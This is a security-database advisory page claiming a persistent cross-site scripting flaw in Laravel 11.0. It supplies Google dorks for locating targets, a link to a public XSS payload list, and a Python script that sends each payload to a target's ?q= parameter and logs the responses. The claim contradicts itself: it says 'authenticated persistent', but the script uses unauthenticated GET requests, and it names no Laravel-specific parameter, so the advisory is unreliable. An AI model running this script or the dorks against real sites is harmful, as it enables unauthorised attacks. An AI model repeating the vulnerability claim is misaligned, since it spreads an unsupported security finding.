---
title: Laravel 11.0 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2024120021
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-12-19
fetch_date: 2025-10-06T19:33:07.255421
---

# Laravel 11.0 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Laravel 11.0 Cross Site Scripting** **2024.12.18**  **![ir](https://cert.cx/cxstatic/images/flags/ir.png) [E1.Coders](https://cxsecurity.com/author/E1.Coders/1/) **(IR)** ![ir](https://cert.cx/cxstatic/images/flags/ir.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

/\*!
- # VULNERABILITY: Cross Site Scripting Laravel version 11.0
- # Authenticated Persistent XSS
- # GOOGLE DORK: inurl:.com/?q=
- # GOOGLE DORK: Site:.com/?q=
- # DATE: 2024-12-01
- # SECURITY RESEARCHER:  E1.Coders
- # VENDOR: LARAVEL [https://laravel.com/ ]
- # SOFTWARE LINK: https://laravel.com/docs/11.x/installation
- # CVSS: AV:N/AC:L/PR:H/UI:N/S:C
- # CWE: CWE-79
- # download payload https://raw.githubusercontent.com/payloadbox/xss-payload-list/refs/heads/master/Intruder/xss-payload-list.txt
\*/

### -- [ Info: ]

[i] A valid persistent XSS vulnerability was discovered in of the Laravel version 11.0  website.

[i] Vulnerable parameter(s): - inurl:.com/?q=    [AND]    Site:.com/?q=

### -- [ Impact: ]

[~] Malicious JavaScript code injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.

### -- [ EXPLOIT : ]

import requests

# Target URL
url = "https://TARGET.com/?q="

# Function to read payloads from a file
def read\_payloads(filename="payloads.txt"):
    try:
        with open(filename, "r") as f:
            payloads = [line.strip() for line in f]
        return payloads
    except FileNotFoundError:
        print(f"Error: File '{filename}' not found.")
        return []

# Function to perform the request
def xss\_attack(url, payload):
    full\_url = url + payload
    try:
        response = requests.get(full\_url)
        return response.status\_code, response.text # return status code and response text
    except requests.exceptions.RequestException as e:
        print(f"An error occurred during the request: {e}")
        return None, None

# Main function to iterate over payloads and attack
def main():
    payloads = read\_payloads()
    if not payloads:
        return

    results = []
    for payload in payloads:
        status\_code, response\_text = xss\_attack(url, payload)
        if status\_code:
          results.append({"payload": payload, "status\_code": status\_code, "response": response\_text})

    #Save results to a file (Example, you might need to adjust based on your desired output)
    with open("attack\_results.txt", "w") as f:
        for result in results:
            f.write(f"Payload: {result['payload']}\n")
            f.write(f"Status Code: {result['status\_code']}\n")
            f.write(f"Response: {result['response']}\n\n")

if \_\_name\_\_ == "\_\_main\_\_":
    main()

### -- [ Contacts: ]

[+] E-Mail: E1.Coders@Mail.Ru

[+] GitHub: @e1coders

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024120021)

[Tweet](https://twitter.com/share)

Vote for this issue:
 3
 -2

60%

40%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top